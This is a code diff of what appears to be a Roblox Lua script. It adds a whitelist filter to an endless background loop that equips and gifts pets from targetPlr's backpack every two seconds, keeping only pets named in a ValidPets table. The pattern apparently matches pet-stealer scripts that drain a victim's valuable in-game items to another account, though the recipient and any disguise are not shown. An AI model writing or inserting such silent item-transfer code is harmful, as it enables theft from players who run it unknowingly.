@@ -679,31 +679,38 @@ local ValidPets = {
     ["Nightmare Seal"] = true,
 }
 
-        -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
-        task.spawn(function()
-            while true do
-                task.wait(2)  -- Re-scan every 2 seconds
-                local currentPets = GetPlayerPets()
-                if #currentPets == 0 then continue end
 
-                for _, pet in ipairs(currentPets) do
-                    for _, tool in targetPlr.Backpack:GetChildren() do
-                        if tool:IsA("Tool")
-                        and tool:GetAttribute("ItemType") == "Pet"
-                        and tool:GetAttribute("PET_UUID") == pet.Id then
+-- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
+task.spawn(function()
+    while true do
+        task.wait(2)  -- Re-scan every 2 seconds
+        local currentPets = GetPlayerPets()
+        if #currentPets == 0 then continue end
 
-                            print("Equipping & gifting:", tool.Name)
-                            targetPlr.Character.Humanoid:EquipTool(tool)
-                            task.wait(0.6)
+        for _, pet in ipairs(currentPets) do
+            for _, tool in targetPlr.Backpack:GetChildren() do
+                if tool:IsA("Tool")
+                and tool:GetAttribute("ItemType") == "Pet"
+                and tool:GetAttribute("PET_UUID") == pet.Id then
 
-                            for i = 1, 3 do
-                                if giftHeldPet() then
-                                    break
-                                end
-                                task.wait(0.3)
-                            end
+                    -- === FILTER PET ===
+                    if not ValidPets[tool.Name] then
+                        -- print("SKIPPED (not in whitelist):", tool.Name)
+                        continue
+                    end
+
+                    print("Equipping & gifting:", tool.Name)
+                    targetPlr.Character.Humanoid:EquipTool(tool)
+                    task.wait(0.6)
+
+                    for i = 1, 3 do
+                        if giftHeldPet() then
+                            break
                         end
+                        task.wait(0.3)
                     end
                 end
             end
-        end)
+        end
+    end
+end)
